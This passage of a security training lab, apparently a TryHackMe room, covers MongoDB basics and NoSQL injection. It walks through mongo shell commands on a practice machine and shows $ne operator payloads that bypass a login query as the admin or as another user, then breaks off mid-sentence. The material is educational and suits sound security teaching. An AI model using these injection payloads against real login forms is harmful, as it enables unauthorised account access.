NoSQL Injection to bypass a login form</li></ul><p><span style=\"font-weight:bolder\">What is NoSQL</span></p><p>A NoSQL database refers to a non-relational database that is short for <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">non SQL</span> and <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">Not only SQL</span>. It is a data-storing and data-retrieving system. NoSQL databases are commonly used nowadays for big Data and IoT devices due to their powerful features such as fast queries, ease of use to developers, scale easily, and flexible data structure. </p><p>Today, we will cover the basic concepts of NoSQL databases and information gathering, enumeration, and exploiting NoSQL vulnerabilities.<br /></p><p><span style=\"font-weight:bolder\">Understanding NoSQL</span></p><p>Various types of NoSQL databases can be covered, including <span style=\"font-size:1rem\">MongoDB, Couchbase, RavenDB, etc. However, i</span><span style=\"font-size:1rem\">n this task, we will focus on</span><span style=\"font-size:1rem\"> </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">MongoDB</span><span style=\"font-size:1rem\"> database, a free and popular document-store NoSQL database.</span></p><p>Similar to relational databases (such as MySQL and MSSQL), MongoDB consists of databases, tables, fields but with different names where </p><ul><li><span style=\"font-size:1rem\"><span style=\"font-weight:bolder\">Collections </span></span><span style=\"font-size:1rem\">are similar to tables or views in MySQL and MSSQL.</span></li><li><span style=\"font-weight:bolder;font-size:1rem\">Documents </span>are similar to rows or records in MySQL and MSSQL.</li><li><span style=\"font-weight:bolder;font-size:1rem\">Fields </span>are similar to columns in MySQL and MSSQL.</li></ul><p>The following graph shows a visual example of these terms as we have a database named<span style=\"font-size:1rem\"> </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">AoC3</span><span style=\"font-size:1rem\"> </span>that has two collections: users, roles. The <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">users</span><span style=\"font-size:1rem\"> </span>collection has two documents (2 records). Documents in MongoDB are objects stored in a format called <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\"><a href=\"https://bsonspec.org/\" target=\"_blank\">BSON</a></span>, which supports <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\"><a href=\"https://www.json.org/json-en.html\" target=\"_blank\">JSON</a></span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">data types for document storing.</span></p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/753375399860b87237241fbd9ab2af72.png\" style=\"width:1076px\" /><br /></p><p>Also, it is useful to briefly look at and compare the query <a href=\"https://docs.mongodb.com/manual/reference/operator/query/\" target=\"_blank\">operators </a>between MongoDB and MySQL:</p><ul><li><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$and</span><span style=\"font-size:1rem\"> </span>equivalent to <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">AND</span><span style=\"font-size:1rem\"> </span>in MySQL</li><li><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$or</span><span style=\"font-size:1rem\"> </span>equivalent to <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">OR</span><span style=\"font-size:1rem\"> </span>in MySQL</li><li><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$eq</span><span style=\"font-size:1rem\"> </span>equivalent to <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">=</span><span style=\"font-size:1rem\"> </span>in MySQL</li></ul>\n\n<p><span style=\"font-weight:bolder\">Interacting with a MongoDB server</span></p><p><strong><u><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\">Note</span></u></strong><span style=\"background:transparent;margin-top:0pt;margin-bottom:0pt\"><u>: To follow up with interacting with the MongoDB server, please deploy the attached machine and use the AttackBox or connect to the VPN in order to log into the SSH server. </u>Use the following credentials:</span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">thm:tryhackme</span><span style=\"font-size:1rem\">.</span></p>\n\n<div class=\"terminal-container\">\n\t<div class=\"terminal-content\">\n\t\t<div class=\"terminal-top\">Terminal</div>\n\t\t<pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">user@machine$ ssh thm@MACHINE_IP -p 2222</code>\n\t    </pre></div></div>\n\n<p>Before we dive into the details of NoSQL injection, it is important to understand how MongoDB works in a general sense. Let's start with connecting to MongoDB on our deployed target machine using the default port <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">27017</span><span style=\"font-size:1rem\">. We will be creating a new database and collections as well as documents. </span></p><p><span style=\"font-size:1rem\"></span></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n<code class=\"language-shell-session\">user@machine$ mongo\nconnecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb\nImplicit session: session { \"id\" : UUID(\"1273eab2-4dae-42a8-8f67-a133b870872b\") }\nMongoDB server version: 4.4.10</code>\n        </pre></div></div><p>Now let's use the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">show</span><span style=\"font-size:1rem\"> command to list </span><span style=\"font-size:1rem\">all the databases that we have in MongoDB on our target machine:</span></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">&gt; show databases\nadmin     0.000GB\nconfig    0.000GB\nlocal     0.000GB\nlogindb   0.000GB\nthm-test  0.000GB\nthmdb     0.000GB</code>\n\t    </pre></div></div><p>Next, if we want to connect to a database, we can do this by using the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">use</span> command. However, we will also show how to create a new database with collections and data. To create a new database, we also use the same <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">use</span><span style=\"font-size:1rem\"> command </span>to create and connect to it. Therefore, the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">use</span> command is used to connect to a database if it exists or create a new one if it doesn't exist. <span style=\"font-size:1rem\">Once the database is created, we can create two new collections, named users and roles</span><span style=\"font-size:1rem\"> using the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">db.createCollection()</span><span style=\"font-size:1rem\"> function, and then show all available collections within the database.</span></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">&gt; use AoC3\nswitched to db AoC3\n&gt; db.createCollection(\"users\")\n{ \"ok\" : 1 }\n&gt; db.createCollection(\"roles\")\n{ \"ok\" : 1 }\n&gt; db.getCollectionNames();\n[ \"roles\", \"users\" ]</code>\n\t    </pre></div></div><p>Next, we create a document within the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">users</span><span style=\"font-size:1rem\"> </span>collection and insert data into it.</p><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">&gt; db.users.insert({id:\"1\", username: \"admin\", email: \"admin@thm.labs\", password: \"idk2021!\"})\nWriteResult({ \"nInserted\" : 1 })\n&gt; db.users.insert({id:\"2\", username: \"user\", email: \"user@thm.labs\", password: \"password1!\"})\nWriteResult({ \"nInserted\" : 1 })\n&gt;\n&gt; db.users.find()\n{ \"_id\" : ObjectId(\"6183dc871ebe3f0c4b779a31\"), \"id\" : \"1\", \"username\" : \"admin\", \"email\" : \"admin@thm.labs\", \"password\" : \"idk2021!\" }\n{ \"_id\" : ObjectId(\"6183dc911ebe3f0c4b779a32\"), \"id\" : \"2\", \"username\" : \"user\", \"email\" : \"user@thm.labs\", \"password\" : \"password1!\" }</code>\n\t    </pre></div><p>We successfully created two documents into <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">users</span><span style=\"font-size:1rem\"> </span>collection and then showed available documents within the collection using <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">db.users.find()</span>. Note that MongoDB automatically creates a unique ID called <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">_id</span><span style=\"font-size:1rem\"> </span>for each document within the collection from the above output. Let's also try to update the document as well as delete it using MongoDB commands. We will be using the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">db.&lt;collection&gt;.update</span><span style=\"font-size:1rem\"> </span> function to update the document with <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">id=2</span><span style=\"font-size:1rem\"> </span>and update the username to be <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">tryhackme</span><span style=\"font-size:1rem\"> </span>and finally shows all documents to make sure our document gets updated.</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">&gt; db.users.update({id:\"2\"}, {$set: {username: \"tryhackme\"}});\nWriteResult({ \"nMatched\" : 1, \"nUpserted\" : 0, \"nModified\" : 1 })\n&gt; db.users.find()\n{ \"_id\" : ObjectId(\"6183dc871ebe3f0c4b779a31\"), \"id\" : \"1\", \"username\" : \"admin\", \"email\" : \"admin@thm.labs\", \"password\" : \"idk2021!\" }\n{ \"_id\" : ObjectId(\"6183dc911ebe3f0c4b779a32\"), \"id\" : \"2\", \"username\" : \"tryhackme\", \"email\" : \"user@thm.labs\", \"password\" : \"password1!\" }</code>\n\t    </pre></div></div><p>Finally, let's remove the document using <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">db.users.remove()</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\"> and then drop </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">db.users.drop()</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">the collection as follows,</span></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">&gt; db.users.remove({'id':'2'})\nWriteResult({ \"nRemoved\" : 1 })\n&gt; db.users.find()\n{ \"_id\" : ObjectId(\"6183dc871ebe3f0c4b779a31\"), \"id\" : \"1\", \"username\" : \"admin\", \"email\" : \"admin@thm.labs\", \"password\" : \"idk2021!\" }\n&gt; db.users.drop()\ntrue</code>\n\t    </pre></div></div><p>Now that we know how to interact with the MongoDB server, look around by using the MongoDB commands we've learned, and find the flag to answer Question 1!</p><p><span style=\"font-weight:bolder\">What is NoSQL Injection?</span></p><p>Now that we have the basic knowledge of dealing with MongoDB commands to create databases and collections as well as insert, update, and delete documents, we will be discussing the NoSQL injection and the risks of having such vulnerability in the application. NoSQL injection is a web security vulnerability that allows the attacker to have control over the database. A NoSQL injection happens by sending queries via untrusted and unfiltered web application input, which leads to leaked unauthorized information. In addition, the attacker can use the NoSQL injection to perform various operations such as modifying data, escalating privileges, DoS attacks, and others.</p><p><span style=\"font-weight:bolder\">Bypassing login pages!</span></p><p>The logic of login pages is similar in most databases: first, connect to the database and then look for a certain username and password; if they exist in the collection (in the database), then we have a valid entry. The following is the query that is used in the web applications used on our login page: <span style=\"font-size:1rem\"> </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">db.users.find({query})</span><span style=\"font-size:1rem\"> or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">db.users.findOne(query)</span><span style=\"font-size:1rem\">  functions </span><span style=\"font-size:1rem\">where</span><span style=\"font-size:1rem\"> the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">query</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">is JSON data that's send via the application: </span><span style=\"font-size:1rem\"> </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">{\"username\": \"admin\", \"password\":\"adminpass\"}</span><span style=\"font-size:1rem\">.  Note that when we provide the correct credentials, a document returns, while a </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">null</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">reply is received when providing the wrong credentials when nothing matches!</span></p><p><span style=\"font-size:1rem\"></span></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">&gt; db.users.findOne({username: \"admin\", password: \"adminpass\"})\n{\n        \"_id\" : ObjectId(\"6183ef6292dea43d75f0c820\"),\n        \"id\" : \"1\",\n        \"username\" : \"admin\",\n        \"email\" : \"admin@thm.labs\",\n        \"password\" : \"adminpass\"\n}\n&gt; db.users.findOne({username: \"admin\", password: \"adminpasss\"})\nnull</code>\n\t    </pre></div></div><p>Before exploiting the NoSQL injection, there are MongoDB operators that we need to be familiar with that are heavily used in the injections, which are:<br /></p><p style=\"line-height:1\"><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$eq</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">- matches records that equal to a certain value</span></p><p style=\"line-height:1\"><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$ne</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">- matches records that are not equal to a certain value</span></p><p style=\"line-height:1\"><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$gt</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">- matches records that are greater than a certain value.</span></p><p style=\"line-height:1\"><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$where</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">- matches records based on Javascript condition</span></p><p style=\"line-height:1\"><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$exists</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">- matches records that have a certain field</span></p><p style=\"line-height:1\"></p><p style=\"line-height:1\"><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$regex</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">- matches records that satisfy certain regular expressions.</span></p><p>Visit the <a href=\"https://docs.mongodb.com/manual/reference/operator/query/\" target=\"_blank\">MongoDB website</a> for more information about the MongoDB operators. Next, we will be exploiting the logic of the login query by injecting a JSON object which includes one of the NoSQL operators, which is <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$ne</span><span style=\"font-size:1rem\">. </span></p><p></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">&gt; db.users.findOne({username: \"admin\", password: {\"$ne\":\"xyz\"}})\n{\n        \"_id\" : ObjectId(\"6183ef6292dea43d75f0c820\"),\n        \"id\" : \"1\",\n        \"username\" : \"admin\",\n        \"email\" : \"admin@thm.labs\",\n        \"password\" : \"adminpass\"\n}</code>\n\t    </pre></div></div><p>We injected a JSON objection <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">{\"$ne\": \"XYZ\"}</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\"> in the password field, and we changed the logic to become as follows:</span></p><ul><li><span style=\"font-size:1rem\">We are telling MongoDB to find a document (user) with a username equal to </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">admin</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">and his password is </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">not equal</span><span style=\"font-size:1rem\"> to </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">xyz</span><span style=\"font-size:1rem\">, </span><span style=\"font-size:1rem\">which turns this statement to TRUE because the admin's password is not </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">xyz</span><span style=\"font-size:1rem\">.</span></li></ul><p>As a result, we have successfully retrieved the document from MongoDB since our statement's logic is true. By applying this concept against a login page of a web application, we will be able to bypass the login page.</p><p>Now let's say if we wanted to log in to a system as another user who is not admin. In this case, we can also inject into a username field to be as follows,</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">MongoDB</div><pre class=\"terminal-code\" style=\"font-size:14px\">           \n\t\t\t<code class=\"language-shell-session\">&gt; db.users.findOne({username:{\"$ne\":\"admin\"},password:{\"$ne\":\"xyz\"}})\n{\n        \"_id\" : ObjectId(\"6183ef5b92dea43d75f0c81f\"),\n        \"id\" : \"2\",\n        \"username\" : \"user\",\n        \"email\" : \"user@thm.labs\",\n        \"password\" : \"password1!\"\n}</code>\n\t    </pre></div></div><p>If this were a login page, we would be logged in as a not <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">admin</span><span style=\"font-size:1rem\">, </span>which is the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">user</span>. We injected two JSON objects into a username as well as password fields: we are telling MongoDB to find a document that its username is <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">not equal</span><span style=\"font-size:1rem\"> </span>to admin and its password is <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">not equal</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">to </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">xyz</span><span style=\"font-size:1rem\">, which returns the statement as true.</span></p><p><span style=\"font-weight:bolder\">Exploiting NoSQL injection</span></p><p>To exploit NoSQL injection within the web application, first, you need to find an entry point that doesn't sanitize the user's input. Next, you need to understand how the web application passes the request to the database! Once you find an entry point, passing queries could be varied. Sometimes, the web app accepts the user's input via <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 